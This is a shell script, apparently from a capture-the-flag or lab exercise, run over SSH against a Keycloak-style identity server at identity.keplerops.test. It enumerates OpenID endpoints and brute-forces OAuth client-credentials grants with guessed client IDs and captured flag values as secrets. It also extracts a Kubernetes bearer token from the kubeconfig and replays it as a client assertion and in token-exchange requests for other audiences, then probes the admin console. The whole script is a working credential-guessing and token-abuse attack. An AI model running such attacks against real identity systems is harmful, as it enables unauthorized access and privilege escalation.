set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
I=https://identity.keplerops.test
echo "=== WELL KNOWN keplerops ==="
curl -sSk -m 8 "$I/realms/keplerops/.well-known/openid-configuration" | python3 -m json.tool 2>&1 | head -80
echo "=== WELL KNOWN master ==="
curl -sSk -m 8 "$I/realms/master/.well-known/openid-configuration" | python3 -m json.tool 2>&1 | head -40
echo "=== REALM keplerops detail ==="
curl -sSk -m 8 "$I/realms/keplerops" | python3 -m json.tool 2>&1 | head -40
T="$I/realms/keplerops/protocol/openid-connect/token"
W="FLAG{6bb66074f2325405}"
W2="FLAG{adfbabdcdaca98ac}"
JWT=$(kubectl config view --raw -o jsonpath='{.users[0].user.token}')
echo "=== CLIENT CREDENTIALS GUESSES ==="
for c in rowan-workspace fieldlink-workspace fieldkest-workspace workspace fieldlink-workload workload support-export support-export-reader support rowan; do
 for s in "$W" "$W2"; do
  r=$(curl -sSk -m 8 -o /tmp/o -w '%{http_code}' -d "grant_type=client_credentials&client_id=$c&client_secret=$s" "$T")
  echo "-- client=$c secret=${s:0:10}.. -> $r :: $(head -c 220 /tmp/o | tr '\n' ' ')"
 done
done
echo "=== JWT AS CLIENT ASSERTION ==="
for c in rowan-workspace fieldlink-workload workload support-export-reader; do
 r=$(curl -sSk -m 8 -o /tmp/o -w '%{http_code}' -d "grant_type=client_credentials&client_id=$c&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$JWT" "$T")
 echo "-- client=$c jwt -> $r :: $(head -c 220 /tmp/o|tr '\n' ' ')"
done
echo "=== RFC8693 TOKEN EXCHANGE with JWT ==="
for a in support.keplerops.test support-export-reader fieldlink-workload rowan-workspace; do
 r=$(curl -sSk -m 8 -o /tmp/o -w '%{http_code}' -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&client_id=rowan-workspace&subject_token=$JWT&subject_token_type=urn:ietf:params:oauth:token-type:jwt&audience=$a" "$T")
 echo "-- audience=$a -> $r :: $(head -c 260 /tmp/o|tr '\n' ' ')"
done
echo "=== ACCOUNT/CONSOLE PAGES ==="
for p in /realms/keplerops/account/ /realms/master/console/ /admin/master/console/ /realms/keplerops/protocol/openid-connect/certs /realms/keplerops/.well-known/openid-configuration; do
 echo "-- $p"; curl -sSk -m 7 -o /dev/null -w '%{http_code}\n' "$I$p"
done
RSH
echo DONE_K14_R20
